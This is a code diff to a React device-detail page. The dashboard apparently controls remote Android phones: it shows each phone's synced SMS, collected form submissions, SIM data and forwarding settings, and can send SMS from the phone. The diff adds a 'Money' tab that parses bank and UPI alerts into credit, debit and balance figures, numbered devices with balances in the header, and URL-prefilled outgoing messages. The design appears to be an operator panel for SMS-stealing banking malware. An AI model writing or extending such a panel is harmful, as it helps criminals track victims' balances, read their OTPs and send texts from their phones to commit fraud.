@@ -1,55 +1,205 @@
-import { useEffect, useState, useRef } from 'react';
-import { useParams, useNavigate } from 'react-router-dom';
+import { useEffect, useMemo, useState, useRef } from 'react';
+import { useParams, useNavigate, useSearchParams } from 'react-router-dom';
 import { useDevices } from '../contexts/DeviceContext';
 import { useSocket } from '../contexts/SocketContext';
 import { SMS, FormData, SimInfo } from '../types';
+import {
+    formatINR,
+    getDeviceNumberMap,
+    getLatestBalance,
+    getSimLabelForSms,
+    getSimSummary,
+    isTransactionMessage,
+    parseTransaction,
+} from '../utils/transactions';
 
-type TabType = 'sms' | 'forms' | 'settings' | 'sendsms';
+type TabType = 'sms' | 'money' | 'forms' | 'settings' | 'sendsms';
 
 function formatTime(timestamp: string): string {
     return new Date(timestamp).toLocaleString();
 }
 
-// SMS List Component
-function SMSList({ messages }: { messages: SMS[] }) {
-    // Sort messages by timestamp (newest first)
-    const sortedMessages = [...messages].sort((a, b) =>
-        new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
-    );
+// SMS List Component — now searchable / filterable, SIM- and money-aware
+function SMSList({ messages, simCards }: { messages: SMS[]; simCards: SimInfo[] }) {
+    const [query, setQuery] = useState('');
+    const [typeFilter, setTypeFilter] = useState<'all' | 'incoming' | 'outgoing'>('all');
+    const [moneyOnly, setMoneyOnly] = useState(false);
 
-    if (sortedMessages.length === 0) {
+    const filtered = useMemo(() => {
+        const q = query.trim().toLowerCase();
+        const list = messages.filter((sms) => {
+            if (typeFilter !== 'all' && sms.type !== typeFilter) return false;
+            if (moneyOnly && !isTransactionMessage(sms.message)) return false;
+            if (!q) return true;
+            const party = (sms.type === 'incoming' ? sms.sender : sms.receiver).toLowerCase();
+            return sms.message.toLowerCase().includes(q) || party.includes(q);
+        });
+        return [...list].sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
+    }, [messages, query, typeFilter, moneyOnly]);
+
+    return (
+        <div>
+            <div className="toolbar toolbar-compact">
+                <div className="search-wrap">
+                    <span className="search-icon">🔍</span>
+                    <input
+                        className="form-input search-input"
+                        placeholder={`Search ${messages.length} messages…`}
+                        value={query}
+                        onChange={(e) => setQuery(e.target.value)}
+                    />
+                    {query && (
+                        <button className="search-clear" onClick={() => setQuery('')} aria-label="Clear search">✕</button>
+                    )}
+                </div>
+                <div className="toolbar-filters">
+                    <div className="segmented">
+                        {(['all', 'incoming', 'outgoing'] as const).map((t) => (
+                            <button key={t} className={`segmented-btn ${typeFilter === t ? 'active' : ''}`} onClick={() => setTypeFilter(t)}>
+                                {t === 'all' ? 'All' : t === 'incoming' ? '📥 In' : '📤 Out'}
+                            </button>
+                        ))}
+                    </div>
+                    <button
+                        className={`segmented-btn ${moneyOnly ? 'active' : ''}`}
+                        onClick={() => setMoneyOnly((v) => !v)}
+                        title="Show only money / transaction messages"
+                    >
+                        💰 Money{moneyOnly ? ' ✓' : ''}
+                    </button>
+                </div>
+            </div>
+
+            {filtered.length === 0 ? (
+                <div className="empty-state" style={{ padding: '2rem' }}>
+                    <div className="empty-state-icon">{messages.length === 0 ? '💬' : '🔍'}</div>
+                    <h2>{messages.length === 0 ? 'No Messages' : 'No matches'}</h2>
+                    <p>{messages.length === 0 ? 'SMS messages will appear here when synced from the device.' : 'Try a different search or clear the filters.'}</p>
+                </div>
+            ) : (
+                <>
+                    <p style={{ fontSize: '0.8rem', color: 'var(--text-muted)', marginBottom: '0.75rem' }}>
+                        Showing {filtered.length} of {messages.length} messages
+                    </p>
+                    <div className="data-list">
+                        {filtered.map((sms) => {
+                            const txn = isTransactionMessage(sms.message) ? parseTransaction(sms.message) : null;
+                            const simLabel = getSimLabelForSms(sms, simCards);
+                            return (
+                                <div key={sms.id} className="data-item">
+                                    <div className={`data-item-icon ${sms.type}`}>
+                                        {sms.type === 'incoming' ? '📥' : '📤'}
+                                    </div>
+                                    <div className="data-item-content">
+                                        <div className="data-item-header">
+                                            <span className="data-item-title">
+                                                {sms.type === 'incoming' ? sms.sender : sms.receiver}
+                                            </span>
+                                            <span className="data-item-time">{formatTime(sms.timestamp)}</span>
+                                        </div>
+                                        <div className="data-item-body">{sms.message}</div>
+                                        <div className="data-item-meta">
+                                            <span className={`badge ${sms.type === 'incoming' ? 'badge-success' : 'badge-warning'}`}>
+                                                {sms.type}
+                                            </span>
+                                            {txn && (
+                                                <span className={`badge ${txn.kind === 'credit' ? 'badge-success' : txn.kind === 'debit' ? 'badge-danger' : 'badge-warning'}`}>
+                                                    💰 {txn.kind}{txn.amount !== null ? ` ${formatINR(txn.amount)}` : ''}
+                                                </span>
+                                            )}
+                                            {txn?.balance !== null && txn?.balance !== undefined && (
+                                                <span className="badge">Bal {formatINR(txn.balance)}</span>
+                                            )}
+                                            {simLabel ? (
+                                                <span className="badge" title="SIM this message was sent/received on (reported by the device)">📶 {simLabel}</span>
+                                            ) : simCards.length > 1 ? (
+                                                <span className="badge" title="Device has multiple SIMs but this message predates per-SIM tagging — update the Android app for per-message SIM labels">📶 SIM n/a</span>
+                                            ) : null}
+                                        </div>
+                                    </div>
+                                </div>
+                            );
+                        })}
+                    </div>
+                </>
+            )}
+        </div>
+    );
+}
+
+// Money / transactions tab for a single device
+function MoneyTab({ messages, deviceName }: { messages: SMS[]; deviceName: string }) {
+    const balance = useMemo(() => getLatestBalance(messages), [messages]);
+    const txns = useMemo(() => {
+        return messages
+            .filter((s) => isTransactionMessage(s.message))
+            .map((sms) => ({ sms, parsed: parseTransaction(sms.message) }))
+            .sort((a, b) => new Date(b.sms.timestamp).getTime() - new Date(a.sms.timestamp).getTime());
+    }, [messages]);
+
+    const totals = useMemo(() => {
+        let credit = 0;
+        let debit = 0;
+        for (const t of txns) {
+            if (t.parsed.kind === 'credit' && t.parsed.amount !== null) credit += t.parsed.amount;
+            if (t.parsed.kind === 'debit' && t.parsed.amount !== null) debit += t.parsed.amount;
+        }
+        return { credit, debit, net: credit - debit };
+    }, [txns]);
+
+    if (txns.length === 0) {
         return (
             <div className="empty-state" style={{ padding: '2rem' }}>
-                <div className="empty-state-icon">💬</div>
-                <h2>No Messages</h2>
-                <p>SMS messages will appear here when synced from the device.</p>
+                <div className="empty-state-icon">💰</div>
+                <h2>No money messages</h2>
+                <p>No credit, debit or balance SMS found on {deviceName} yet. Bank and UPI alerts appear here automatically.</p>
             </div>
         );
     }
 
     return (
-        <div className="data-list">
-            {sortedMessages.map(sms => (
-                <div key={sms.id} className="data-item">
-                    <div className={`data-item-icon ${sms.type}`}>
-                        {sms.type === 'incoming' ? '📥' : '📤'}
-                    </div>
-                    <div className="data-item-content">
-                        <div className="data-item-header">
-                            <span className="data-item-title">
-                                {sms.type === 'incoming' ? sms.sender : sms.receiver}
-                            </span>
-                            <span className="data-item-time">{formatTime(sms.timestamp)}</span>
-                        </div>
-                        <div className="data-item-body">{sms.message}</div>
-                        <div className="data-item-meta">
-                            <span className={`badge ${sms.type === 'incoming' ? 'badge-success' : 'badge-warning'}`}>
-                                {sms.type}
-                            </span>
-                        </div>
-                    </div>
+        <div>
+            {balance && (
+                <div className="glass-card balance-card" style={{ marginBottom: '1rem' }}>
+                    <div className="balance-device">🏦 Latest known balance</div>
+                    <div className="balance-amount">{formatINR(balance.balance)}</div>
+                    <div className="balance-meta">via {balance.sender} · {formatTime(balance.timestamp)}</div>
                 </div>
-            ))}
+            )}
+            <div className="stats-row" style={{ marginBottom: '1rem' }}>
+                <div className="stat-card stat-online">
+                    <div className="stat-value">{formatINR(totals.credit)}</div>
+                    <div className="stat-label">Credited</div>
+                </div>
+                <div className="stat-card stat-offline">
+                    <div className="stat-value">{formatINR(totals.debit)}</div>
+                    <div className="stat-label">Debited</div>
+                </div>
+                <div className="stat-card stat-money">
+                    <div className="stat-value">{formatINR(totals.net)}</div>
+                    <div className="stat-label">Net</div>
+                </div>
+            </div>
+            <div className="data-list">
+                {txns.map(({ sms, parsed }) => (
+                    <div key={sms.id} className="data-item">
+                        <div className="data-item-icon">{parsed.kind === 'credit' ? '💵' : parsed.kind === 'debit' ? '💸' : '🏦'}</div>
+                        <div className="data-item-content">
+                            <div className="data-item-header">
+                                <span className="data-item-title">{sms.type === 'incoming' ? sms.sender : sms.receiver}</span>
+                                <span className="data-item-time">{formatTime(sms.timestamp)}</span>
+                            </div>
+                            <div className="data-item-body">{sms.message}</div>
+                            <div className="data-item-meta">
+                                <span className={`badge ${parsed.kind === 'credit' ? 'badge-success' : parsed.kind === 'debit' ? 'badge-danger' : 'badge-warning'}`}>
+                                    {parsed.kind}{parsed.amount !== null ? ` · ${formatINR(parsed.amount)}` : ''}
+                                </span>
+                                {parsed.balance !== null && <span className="badge">Bal {formatINR(parsed.balance)}</span>}
+                            </div>
+                        </div>
+                    </div>
+                ))}
+            </div>
         </div>
     );
 }
@@ -162,14 +312,15 @@ function FormsList({ forms }: { forms: FormData[] }) {
 }
 
 
-// SIM Cards Component
+// SIM Cards Component — proper multi-SIM detection display
 function SimCardsList({ simCards }: { simCards: SimInfo[] }) {
+    const summary = getSimSummary(simCards);
     if (!simCards || simCards.length === 0) {
         return (
             <div className="section">
                 <h3 className="section-title">📱 SIM Cards</h3>
                 <div style={{ padding: '1rem', color: 'var(--text-muted)', textAlign: 'center' }}>
-                    No SIM information available. Device may need to sync.
+                    No SIM information available. Device may need to sync (open the Android app and pull to sync).
                 </div>
             </div>
         );
@@ -177,46 +328,54 @@ function SimCardsList({ simCards }: { simCards: SimInfo[] }) {
 
     return (
         <div className="section">
-            <h3 className="section-title">📱 SIM Cards ({simCards.length})</h3>
+            <h3 className="section-title">
+                📱 SIM Cards ({simCards.length}) — {simCards.length > 1 ? 'Dual/Multi SIM detected' : summary.label}
+            </h3>
             <div style={{ display: 'grid', gap: '1rem', gridTemplateColumns: 'repeat(auto-fit, minmax(250px, 1fr))' }}>
-                {simCards.map((sim, idx) => (
-                    <div key={idx} style={{
-                        background: 'var(--bg-secondary)',
-                        borderRadius: 'var(--radius-md)',
-                        padding: '1rem',
-                        border: '1px solid var(--border-color)'
-                    }}>
+                {[...simCards].sort((a, b) => a.slotIndex - b.slotIndex).map((sim, idx) => (
+                    <div key={idx} className={`sim-card ${simCards.length > 1 ? 'multi' : ''}`}>
                         <div style={{ display: 'flex', alignItems: 'center', gap: '0.75rem', marginBottom: '0.75rem' }}>
                             <span style={{ fontSize: '1.5rem' }}>📶</span>
                             <div>
                                 <div style={{ fontWeight: 600, color: 'var(--text-primary)' }}>
-                                    {sim.displayName || `SIM ${sim.slotIndex + 1}`}
+                                    SIM {sim.slotIndex + 1} · {sim.displayName || `Slot ${sim.slotIndex + 1}`}
                                 </div>
                                 <div style={{ fontSize: '0.875rem', color: 'var(--text-muted)' }}>
-                                    Slot {sim.slotIndex + 1}
+                                    Slot {sim.slotIndex + 1} · subId {sim.subscriptionId}
                                 </div>
                             </div>
+                            <span className="badge badge-success" style={{ marginLeft: 'auto' }}>active</span>
                         </div>
                         <div style={{ fontSize: '0.875rem', display: 'flex', flexDirection: 'column', gap: '0.25rem' }}>
                             <div><strong>Carrier:</strong> {sim.carrierName || 'Unknown'}</div>
-                            <div><strong>Number:</strong> {sim.phoneNumber || 'Not available'}</div>
+                            <div><strong>Number:</strong> {sim.phoneNumber || 'Hidden by carrier / not available'}</div>
                             {sim.countryIso && <div><strong>Country:</strong> {sim.countryIso.toUpperCase()}</div>}
                         </div>
                     </div>
                 ))}
             </div>
+            {simCards.length > 1 && (
+                <p style={{ fontSize: '0.8rem', color: 'var(--text-muted)', marginTop: '0.75rem' }}>
+                    Multi-SIM device: choose the sending SIM in “Send SMS”, and per-message SIM badges appear once the Android app reports subId (newer builds).
+                </p>
+            )}
         </div>
     );
 }
 
 // Send SMS Component
-function SendSMSPanel({ deviceId, simCards, deviceStatus }: { deviceId: string; simCards: SimInfo[]; deviceStatus: string }) {
+function SendSMSPanel({ deviceId, simCards, deviceStatus, initialTo = '', initialBody = '' }: { deviceId: string; simCards: SimInfo[]; deviceStatus: string; initialTo?: string; initialBody?: string }) {
     const { sendSms } = useDevices();
-    const [recipientNumber, setRecipientNumber] = useState('');
-    const [message, setMessage] = useState('');
+    const [recipientNumber, setRecipientNumber] = useState(initialTo);
+    const [message, setMessage] = useState(initialBody);
     const [selectedSim, setSelectedSim] = useState<number>(-1);
     const [isSending, setIsSending] = useState(false);
     const [sendResult, setSendResult] = useState<{ success: boolean; message: string } | null>(null);
+
+    useEffect(() => {
+        setRecipientNumber(initialTo);
+        setMessage(initialBody);
+    }, [initialTo, initialBody]);
 
     const handleSend = async () => {
         if (!recipientNumber.trim() || !message.trim()) {
@@ -260,22 +419,29 @@ function SendSMSPanel({ deviceId, simCards, deviceStatus }: { deviceId: string; 
                 </div>
             )}
 
-            {simCards && simCards.length > 1 && (
+            {simCards && simCards.length > 0 && (
                 <div className="form-group">
-                    <label className="form-label">Select SIM Card</label>
+                    <label className="form-label">
+                        Select SIM Card {simCards.length > 1 ? `(${simCards.length} detected)` : ''}
+                    </label>
                     <select
                         className="form-input"
                         value={selectedSim}
                         onChange={(e) => setSelectedSim(Number(e.target.value))}
                         disabled={isOffline || isSending}
                     >
-                        <option value={-1}>Default SIM</option>
-                        {simCards.map((sim, idx) => (
+                        <option value={-1}>Default SIM (device default)</option>
+                        {[...simCards].sort((a, b) => a.slotIndex - b.slotIndex).map((sim, idx) => (
                             <option key={idx} value={sim.subscriptionId}>
-                                {sim.displayName || `SIM ${sim.slotIndex + 1}`} ({sim.carrierName})
+                                SIM {sim.slotIndex + 1} — {sim.displayName || `Slot ${sim.slotIndex + 1}`} ({sim.carrierName}{sim.phoneNumber ? ` · ${sim.phoneNumber}` : ''})
                             </option>
                         ))}
                     </select>
+                    {simCards.length > 1 && (
+                        <div style={{ fontSize: '0.75rem', color: 'var(--text-muted)', marginTop: '0.25rem' }}>
+                            Dual/multi SIM detected — pick which SIM sends this message.
+                        </div>
+                    )}
                 </div>
             )}
 
@@ -487,10 +653,14 @@ function ForwardingSettings({ deviceId, simCards }: { deviceId: string; simCards
 export default function DeviceDetail() {
     const { id } = useParams<{ id: string }>();
     const navigate = useNavigate();
+    const [params] = useSearchParams();
     const { devices, deviceData, getDeviceData, requestSync } = useDevices();
     useSocket(); // Ensures socket is connected
 
-    const [activeTab, setActiveTab] = useState<TabType>('sms');
+    const initialTab = (params.get('tab') as TabType) || 'sms';
+    const [activeTab, setActiveTab] = useState<TabType>(
+        ['sms', 'money', 'forms', 'settings', 'sendsms'].includes(initialTab) ? initialTab : 'sms',
+    );
     const [isSyncing, setIsSyncing] = useState(false);
 
     const device = devices.find(d => d.id === id);
@@ -502,9 +672,22 @@ export default function DeviceDetail() {
         }
     }, [id, getDeviceData]);
 
+    const numberMap = getDeviceNumberMap(devices);
+    const deviceNumber = id ? numberMap.get(id) ?? 0 : 0;
+    const simCards = device?.simCards || data?.simCards || [];
+    const smsCount = data?.sms.length || 0;
+    const moneyCount = useMemo(
+        () => (data?.sms || []).filter((s) => isTransactionMessage(s.message)).length,
+        [data?.sms],
+    );
+    const balance = useMemo(
+        () => (data?.sms ? getLatestBalance(data.sms, id || '', device?.name || '') : null),
+        [data?.sms, id, device?.name],
+    );
+
     if (!device) {
         return (
-            <div className="app-container">
+            <>
                 <button className="back-button" onClick={() => navigate('/')}>
                     ← Back to Dashboard
                 </button>
@@ -513,22 +696,31 @@ export default function DeviceDetail() {
                     <h2>Device Not Found</h2>
                     <p>The device you're looking for doesn't exist or has been disconnected.</p>
                 </div>
-            </div>
+            </>
         );
     }
 
     return (
-        <div className="app-container">
+        <>
             <button className="back-button" onClick={() => navigate('/')}>
                 ← Back to Dashboard
             </button>
 
             <header className="page-header">
                 <div style={{ display: 'flex', alignItems: 'center', gap: '1rem' }}>
-                    <div className="device-icon" style={{ width: 56, height: 56, fontSize: '1.75rem' }}>📱</div>
+                    <div className="device-icon" style={{ width: 56, height: 56, fontSize: '1.75rem', position: 'relative' }}>
+                        📱
+                        <span className="device-number-float">#{deviceNumber}</span>
+                    </div>
                     <div>
-                        <h1 className="page-title">{device.name}</h1>
-                        <p className="page-subtitle">{device.phoneNumber}</p>
+                        <h1 className="page-title">#{deviceNumber} {device.name}</h1>
+                        <p className="page-subtitle">
+                            {device.phoneNumber || 'No number'}
+                            {simCards.length > 0 && (
+                                <> · 📶 {getSimSummary(simCards).label}{getSimSummary(simCards).carriers ? ` (${getSimSummary(simCards).carriers})` : ''}</>
+                            )}
+                            {balance && <> · 💰 {formatINR(balance.balance)}</>}
+                        </p>
                         {/* Forwarding status badges */}
                         <div style={{ display: 'flex', gap: '0.5rem', marginTop: '0.5rem', flexWrap: 'wrap' }}>
                             {data?.forwarding?.smsEnabled && (
@@ -591,7 +783,13 @@ export default function DeviceDetail() {
                     className={`tab ${activeTab === 'sms' ? 'active' : ''}`}
                     onClick={() => setActiveTab('sms')}
                 >
-                    💬 SMS ({data?.sms.length || 0})
+                    💬 SMS ({smsCount})
+                </button>
+                <button
+                    className={`tab ${activeTab === 'money' ? 'active' : ''}`}
+                    onClick={() => setActiveTab('money')}
+                >
+                    💰 Money ({moneyCount})
                 </button>
                 <button
                     className={`tab ${activeTab === 'sendsms' ? 'active' : ''}`}
@@ -614,18 +812,25 @@ export default function DeviceDetail() {
             </div>
 
             <div className="glass-card">
-                {activeTab === 'sms' && <SMSList messages={data?.sms || []} />}
+                {activeTab === 'sms' && <SMSList messages={data?.sms || []} simCards={simCards} />}
+                {activeTab === 'money' && <MoneyTab messages={data?.sms || []} deviceName={device.name} />}
                 {activeTab === 'sendsms' && id && (
                     <>
-                        <SimCardsList simCards={device.simCards || data?.simCards || []} />
+                        <SimCardsList simCards={simCards} />
                         <div style={{ marginTop: '1.5rem' }}>
                             <h3 className="section-title">📤 Send SMS from Device</h3>
-                            <SendSMSPanel deviceId={id} simCards={device.simCards || data?.simCards || []} deviceStatus={device.status} />
+                            <SendSMSPanel
+                                deviceId={id}
+                                simCards={simCards}
+                                deviceStatus={device.status}
+                                initialTo={params.get('to') || ''}
+                                initialBody={params.get('body') || ''}
+                            />
                         </div>
                     </>
                 )}
                 {activeTab === 'forms' && <FormsList forms={data?.forms || []} />}
-                {activeTab === 'settings' && id && <ForwardingSettings deviceId={id} simCards={device.simCards || data?.simCards || []} />}
+                {activeTab === 'settings' && id && <ForwardingSettings deviceId={id} simCards={simCards} />}
             </div>
 
             {/* Mobile Bottom Navigation */}
@@ -637,6 +842,13 @@ export default function DeviceDetail() {
                     >
                         <span className="nav-icon">💬</span>
                         <span>SMS</span>
+                    </button>
+                    <button
+                        className={`nav-item ${activeTab === 'money' ? 'active' : ''}`}
+                        onClick={() => setActiveTab('money')}
+                    >
+                        <span className="nav-icon">💰</span>
+                        <span>Money</span>
                     </button>
                     <button
                         className={`nav-item ${activeTab === 'sendsms' ? 'active' : ''}`}
@@ -661,7 +873,6 @@ export default function DeviceDetail() {
                     </button>
                 </div>
             </nav>
-        </div>
+        </>
     );
 }
-
